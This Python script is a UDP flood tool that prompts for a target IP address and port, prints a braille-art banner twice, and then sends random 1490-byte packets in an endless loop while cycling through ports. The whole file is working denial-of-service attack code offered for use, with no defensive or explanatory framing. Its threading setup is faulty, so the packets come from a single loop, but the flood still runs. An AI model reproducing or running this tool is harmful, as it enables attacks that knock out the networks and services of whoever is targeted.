import sys
import os
import threading
import time
import socket
import random
from datetime import datetime

now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)



class bcolors:
    OKGREEN = '\033[92m'


os.system("clear")

banner = '''
⢠⣶⣶⣶⣤⡀
     ⢸⣿⣿⠛⣿⣿⣧
   ⢀ ⠈⠻⣿⣄⣿⣿⣿⡇
 ⣶⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⡇
 ⠈⠻⠟⠛⠉⠉⠉⠉⣿⣿⣿⣇
      ⢠⣴⣶⣿⣿⣿⣿⣶⣶⣶⣤
      ⠸⣿⣿⣧⣿⣿⡟ ⠹⣿⣿
        ⠈⠉⠉⠉   ⠈⢿
    ⣀⣤⣤⣶⣶⣦⣤⡀
⣾⣷ ⢸⣿⣟⣹⣿⡏⣿⣿⣿⡆
⠈⠁ ⠈⠙⠻⠿⠟⠃⣿⣿⣿⡇
 ⢶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⡇
 ⠈⠙⠟⠛⠛⠛⠛⠛⠛⠛⠋
       ⢠⣤⣶⣶⣶⠶⣶⣶⣄
        ⠉⠙⠉  ⢻⣿⣿⣧
     ⠠⣿⡦     ⣸⣿⣿⣿
      ⠈  ⢀⣤⣀⣠⣿⣿⣿⡏
          ⠈⠉⠙⠿⠋⠁
 ⠲⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⠄
  ⠈⠙⠉⠉⠉⠉⠁
 ⣤⣶⣶⣦⣤⣤⣀⡀⣀⣀⣀⡀
 ⠈⠛⠛⠛⣩⣽⣿⣿⣿⡛⣿⣷
  ⣠⣶⣿⣿⡟⠉ ⠘⠿⣿⣿
 ⠸⠿⣿⡿⠛      ⠉
⣀⣀  ⢠⣴⣶⣶⡶⣶⣦⣀
⢘⣇ ⢸⣿⣏⢹⣿⡇⣿⣿⣿⡇
⠉⠋ ⠈⠉⠛⠛⠛⠁⣿⣿⣿⡇
     ⢰⣾⣿⣿⣿⣿⣿⠃
     ⠘⢿⣿ ⢹⣿⣿⡄
      ⠈⠻⣧⣼⣿⣿⡇
        ⣴⣿⣿⣿⡃
        ⠉⣿⣿⣿⡇
         ⣿⣿⡟⢡⢶⣶⣄
         ⢸⣿⡇⢸ ⣿⣿⣇
          ⠛⠻⠟ ⣿⣿⣿
             ⣰⣿⣿⡿
          ⠸⣿⣿⣿⣿⣿⣿⠃
'''

print(bcolors.OKGREEN + banner)

ip = input("IP Target: ")
port = int(input("Port: "))

os.system("clear")


class bcolors:
    OKGREEN = '\033[92m'


os.system("clear")

banner = '''
⢠⣶⣶⣶⣤⡀
     ⢸⣿⣿⠛⣿⣿⣧
   ⢀ ⠈⠻⣿⣄⣿⣿⣿⡇
 ⣶⣿⣿⣿⣿⣷⣶⣿⣿⣿⣿⡇
 ⠈⠻⠟⠛⠉⠉⠉⠉⣿⣿⣿⣇
      ⢠⣴⣶⣿⣿⣿⣿⣶⣶⣶⣤
      ⠸⣿⣿⣧⣿⣿⡟ ⠹⣿⣿
        ⠈⠉⠉⠉   ⠈⢿
    ⣀⣤⣤⣶⣶⣦⣤⡀
⣾⣷ ⢸⣿⣟⣹⣿⡏⣿⣿⣿⡆
⠈⠁ ⠈⠙⠻⠿⠟⠃⣿⣿⣿⡇
 ⢶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⡇
 ⠈⠙⠟⠛⠛⠛⠛⠛⠛⠛⠋
       ⢠⣤⣶⣶⣶⠶⣶⣶⣄
        ⠉⠙⠉  ⢻⣿⣿⣧
     ⠠⣿⡦     ⣸⣿⣿⣿
      ⠈  ⢀⣤⣀⣠⣿⣿⣿⡏
          ⠈⠉⠙⠿⠋⠁
 ⠲⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⠄
  ⠈⠙⠉⠉⠉⠉⠁
 ⣤⣶⣶⣦⣤⣤⣀⡀⣀⣀⣀⡀
 ⠈⠛⠛⠛⣩⣽⣿⣿⣿⡛⣿⣷
  ⣠⣶⣿⣿⡟⠉ ⠘⠿⣿⣿
 ⠸⠿⣿⡿⠛      ⠉
⣀⣀  ⢠⣴⣶⣶⡶⣶⣦⣀
⢘⣇ ⢸⣿⣏⢹⣿⡇⣿⣿⣿⡇
⠉⠋ ⠈⠉⠛⠛⠛⠁⣿⣿⣿⡇
     ⢰⣾⣿⣿⣿⣿⣿⠃
     ⠘⢿⣿ ⢹⣿⣿⡄
      ⠈⠻⣧⣼⣿⣿⡇
        ⣴⣿⣿⣿⡃
        ⠉⣿⣿⣿⡇
         ⣿⣿⡟⢡⢶⣶⣄
         ⢸⣿⡇⢸ ⣿⣿⣇
          ⠛⠻⠟ ⣿⣿⣿
             ⣰⣿⣿⡿
          ⠸⣿⣿⣿⣿⣿⣿⠃
'''

print(bcolors.OKGREEN + banner)

sent = 0


def task(_port):
    global sent
    bytes = random._urandom(1490)
    while True:
        sock.sendto(bytes, (ip, _port))
        sent = sent + 1
        _port = _port + 1
        print("Sent %s packet to %s through port:%s" % (sent, ip, _port))
        if _port == 65534:
            _port = 1


# Create a list of threads.
threads = []
for i in range(10000):
    thread = threading.Thread(target=task(port))
    threads.append(thread)

# Start all of the threads.
for thread in threads:
    thread.start()

# Wait for all of the threads to finish.
for thread in threads:
    thread.join()
